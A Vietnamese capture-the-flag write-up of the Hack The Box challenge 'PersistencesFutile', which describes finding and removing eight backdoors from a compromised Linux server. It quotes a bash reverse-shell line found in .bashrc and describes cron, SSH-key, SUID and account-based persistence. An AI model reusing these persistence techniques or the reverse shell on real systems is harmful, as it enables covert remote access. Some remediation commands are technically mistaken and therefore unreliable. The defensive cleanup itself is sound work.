# PersistencesFutile - Hack The Box  
**Độ khó:** Medium  

---

## 1. Giới thiệu Challenge  
- Một máy chủ production đã bị hacker đột nhập và cài đặt nhiều backdoor. Server đã được cô lập khỏi internet, và nhiệm vụ là điều tra, tìm các backdoor còn sót lại và làm sạch hệ thống để có thể đưa vào vận hành lại.

---

## 2. Mục tiêu  
- TXác định 8 backdoor khác nhau trên hệ thống
(gồm remote access và privilege escalation).
- Loại bỏ chúng an toàn.
- Khi hoàn tất, chạy /root/solveme bằng quyền root để kiểm tra kết quả.
---

## 3. Phương pháp giải  
### Bước 1: Connnect host, liệt kê file
![alt text](image.png)
![alt text](image-1.png)
- Trước hết ta thấy file backdoor có SUID root rwsr-xr-x khá nguy hiểm nên sẽ xóa nó trước bằng lệnh
 rm -rf .backdoor
### Bước 2 : Kiểm tra các file
![alt text](image-2.png)
- ta thấy file bashrc là 1 file text nên ta sẽ kiểm tra nội dung bên trong và nhận được đoạn reverse shell
![alt text](image-3.png)
- Khi gõ cat nó sẽ chạy:
 bash -i >& /dev/tcp/172.17.0.1/443 0>&1
 - và sẽ kết nối ngược đến ip. Tôi sẽ thực hiện xóa ip này bằng lệnh:
  rm -rf /dev/tcp/172.17.0.1/443

- Ta tìm backdoor dạng shell đang chạy bằng lệnh ps aux:![alt text](image-4.png)
- ta sẽ thực hiện xóa file alertd có port 4444 như trong ảnh:
![alt text](image-5.png)
- Check lại các chương trình đang chạy ta có:
![alt text](image-6.png)
- ta thấy 1 file độc hại là connectivity-check, thực hiện xóa file đó bằng lệnh kill -9 PID sau đó kiểm tra lại xem đã xóa chưa:
![alt text](image-7.png)
### Bước 3 Kiểm tra tệp Binary SUID
- Bằng câu lệnh find / -perm -04000 2>/dev/null, đồng thời xóa các tệp độc hại:
![alt text](image-8.png)
### Bước 4: Dùng crontab
- Vì khi dùng ps aux ta thấy các mốc thời gian nên sẽ sử dụng crontab để check :
![alt text](image-9.png)
- Nó đã chạy các record TXT từ imforce.HTB bằng sh
- Dùng cd /etc và find cron.* để xem các thư mục bắt đầu bằng cron:
![alt text](image-10.png)
- Ta thấy có hai thư mục khả nghi là:
+ pyssh khả năng là 1 file code python
+ access-up
#### 4.1 File Pyssh
![alt text](image-11.png)
- Truy cập vào thư mục ssh_import_id_update ta thấy 1 đoạn code base 64:
![alt text](image-12.png)
- Decode Frombase 64 hai đoạn phát hiện được :
![alt text](image-13.png) ![alt text](image-14.png)
- Thực hiện xóa ky lạ /root/.ssh/authorized_keys đó đi
#### 4.2 File access-up
- Ta sẽ truy cập ssh và access-up để phân tích
![alt text](image-15.png)
- một script độc hại khác đã được xác định với chức năng sao chép /bin/bash vào thư mục hệ thống (/bin hoặc /sbin) dưới một tên ngẫu nhiên và thiết lập bit SUID cho file này.
- Quyền truy cập của set là 4755 nên ta sẽ tìm file và không có gì đặt biệt vì đã xóa từ nãy:
-> thực hiện xóa file access-up
 ### Bước 5: Thử với connectivity-check ở trên
 find / -type f -name “*connectivity-check*” 2>/dev/null
 ![alt text](image-16.png)
 ![alt text](image-17.png)
 Tôi tìm được 1 file 30 -connectivity-check, khi mở nó ra thì nó đang chạy nohup
->thực hiện xóa file này

- Khi attecker đã có thể chạy script nền(nohup) khả năng cao sẽ có quyền root tôi sẽ chuyển qua kiểm tra etc shadow(chứa hash mật khẩu) và passwd(uid):
+ Check passwd
![alt text](image-18.png)
- gnats là user hệ thống nhưng lại có /bin/bash
-> cho phép login shell
- 41:0 cho thấy thuộc group root có quyền cao
![alt text](image-19.png)
 tiến hành sửa 0 thành 41 (hạn chế quyền) và /usr/sbin/nologin để user không nên đăng nhập

 + Check shadow
 ![alt text](image-20.png)
 - Đúng là gnats có quyền đăng nhập -> tiến hành sửa gnats
 ![alt text](image-21.png)

 ## 4. Kết quả
 - Sau khi sửa xong dùng lệnh ./solveme để ra như sau:
 ![alt text](image-22.png)![alt text](image-23.png)

 ## 5. Kết luận
 - Challenge đã khá lạ bắt tôi phải hoàn thành các nhiệm vụ chẳng hạn:
+ Vô hiệu hóa việc thực thi mã độc định kỳ.
+ Chặn khả năng đăng nhập SSH của kẻ tấn công bằng khóa công khai độc hại.
+ Kết thúc phiên điều khiển từ xa đang hoạt động.
 - Việc giải quyết tất cả các Issue (1 đến 8) cho thấy hệ thống đã được khôi phục về trạng thái sạch, loại bỏ được các công cụ và cơ chế duy trì quyền truy cập của kẻ tấn công.





